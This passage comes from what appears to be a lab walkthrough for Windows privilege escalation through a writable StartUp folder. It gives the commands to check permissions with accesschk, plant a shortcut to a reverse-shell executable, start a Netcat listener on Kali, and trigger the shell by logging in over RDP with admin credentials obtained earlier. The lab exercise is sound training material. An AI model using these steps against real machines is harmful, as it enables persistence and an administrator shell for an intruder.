
---

### 🔑 **Step 1: Check Permissions on the StartUp Directory**

Use **`accesschk.exe`** to verify that the **BUILTIN\Users** group can write files to the **StartUp** directory:

```cmd
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

- **What it does:** This checks the permissions on the **StartUp** directory to confirm if users can write files there.
    
- **What to look for:** The output should show that **BUILTIN\Users** has **write** access to this directory.
    

---

### 🧩 **Step 2: Create the Shortcut for the Reverse Shell**

Now use **`cscript`** to run the **VBScript** (`CreateShortcut.vbs`) that will create a shortcut to your reverse shell executable (`reverse.exe`) in the **StartUp** directory:

```cmd
cscript C:\PrivEsc\CreateShortcut.vbs
```

- **What it does:** This script creates a **shortcut** to your **reverse shell** (`reverse.exe`) in the **StartUp** folder.
    
- **Why it works:** The **StartUp** folder runs all programs placed there when a user logs in, so the reverse shell will execute when the admin logs in.
    

---

### 🎧 **Step 3: Start a Listener on Kali**

Prepare Kali to listen for the reverse shell:

```bash
nc -lvnp 4444
```

- **What it does:** Starts a **Netcat listener** on Kali listening on port `4444` for incoming connections.
    
- **Why it works:** The reverse shell will connect back to this port once the **admin** logs in.
    

---

### 🚪 **Step 4: Simulate an Admin Logon via RDP**

Now, simulate an **admin logon** by using the **admin credentials** you previously extracted:

```bash
rdesktop -u admin MACHINE_IP
```

- **What it does:** Initiates an RDP session as the **admin** on the target machine.
    
- **Why it works:** When the admin logs in, the **StartUp** program will run, executing the reverse shell and connecting back to your listener on Kali.
    

---
